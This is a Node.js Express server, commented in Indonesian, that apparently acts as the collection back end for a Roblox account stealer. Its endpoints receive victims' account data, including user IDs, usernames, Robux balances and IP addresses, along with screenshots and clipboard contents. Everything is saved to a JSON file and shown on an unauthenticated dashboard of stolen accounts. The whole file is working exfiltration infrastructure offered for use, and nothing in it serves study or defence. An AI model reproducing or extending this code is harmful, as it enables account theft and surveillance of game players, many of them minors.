const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// Setup multer untuk upload screenshot
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = path.join(__dirname, 'public', 'screenshots');
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, `screenshot_${Date.now()}.jpg`);
    }
});
const upload = multer({ storage });

// Database file
const DATA_FILE = path.join(__dirname, 'accounts.json');

// Inisialisasi database
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ 
        accounts: [], 
        logs: [],
        stats: {
            totalAccounts: 0,
            totalRobux: 0,
            lastUpdate: null
        }
    }));
}

// Helper functions
function readData() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
    }
}

function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// 📡 RECEIVE ACCOUNT DATA
app.post('/api/account', async (req, res) => {
    try {
        const accountData = req.body;
        const data = readData();
        
        // Tambah metadata
        accountData.receivedAt = new Date().toISOString();
        accountData.id = accountData.userId || Date.now().toString();
        accountData.ip = req.ip || req.connection.remoteAddress;
        
        // Cek duplikat
        const existingIndex = data.accounts.findIndex(
            acc => acc.userId === accountData.userId
        );
        
        if (existingIndex !== -1) {
            // Update akun existing
            data.accounts[existingIndex] = {
                ...data.accounts[existingIndex],
                ...accountData,
                updatedAt: new Date().toISOString()
            };
        } else {
            // Tambah akun baru
            data.accounts.push({
                ...accountData,
                createdAt: new Date().toISOString()
            });
            data.stats.totalAccounts = data.accounts.length;
        }
        
        // Update stats
        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (acc.robux || 0), 0);
        data.stats.lastUpdate = new Date().toISOString();
        
        // Log
        data.logs.push({
            type: 'account_received',
            userId: accountData.userId,
            username: accountData.username,
            timestamp: new Date().toISOString(),
            ip: req.ip
        });
        
        writeData(data);
        
        console.log(`✅ Account received: ${accountData.username} (${accountData.userId})`);
        res.json({ 
            success: true, 
            message: 'Account data saved',
            accountId: accountData.id
        });
        
    } catch (error) {
        console.error('Error saving account:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📸 RECEIVE SCREENSHOT
app.post('/api/screenshot', upload.single('screenshot'), async (req, res) => {
    try {
        const { metadata } = req.body;
        const data = readData();
        
        let screenshotUrl = null;
        if (req.file) {
            screenshotUrl = `/screenshots/${req.file.filename}`;
            
            data.logs.push({
                type: 'screenshot',
                url: screenshotUrl,
                metadata: metadata ? JSON.parse(metadata) : {},
                timestamp: new Date().toISOString()
            });
            
            writeData(data);
        }
        
        res.json({ 
            success: true, 
            url: screenshotUrl 
        });
        
    } catch (error) {
        console.error('Error saving screenshot:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📋 RECEIVE CLIPBOARD
app.post('/api/clipboard', async (req, res) => {
    try {
        const clipboardData = req.body;
        const data = readData();
        
        data.logs.push({
            type: 'clipboard',
            content: clipboardData.text?.substring(0, 500) || '',
            hasData: clipboardData.hasData,
            timestamp: new Date().toISOString()
        });
        
        writeData(data);
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error saving clipboard:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📊 GET ALL ACCOUNTS
app.get('/api/accounts', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            accounts: data.accounts,
            stats: data.stats,
            total: data.accounts.length
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🔍 GET SINGLE ACCOUNT
app.get('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        const account = data.accounts.find(a => a.userId === req.params.id);
        
        if (account) {
            res.json({ success: true, account });
        } else {
            res.status(404).json({ success: false, error: 'Account not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🗑️ DELETE ACCOUNT
app.delete('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        data.accounts = data.accounts.filter(a => a.userId !== req.params.id);
        data.stats.totalAccounts = data.accounts.length;
        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (acc.robux || 0), 0);
        
        data.logs.push({
            type: 'account_deleted',
            userId: req.params.id,
            timestamp: new Date().toISOString()
        });
        
        writeData(data);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📈 GET STATS
app.get('/api/stats', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            stats: data.stats,
            recentLogs: data.logs.slice(-20)
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🏠 Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Dashboard running at http://0.0.0.0:${PORT}`);
    console.log(`📊 Open http://localhost:${PORT} to view dashboard`);
});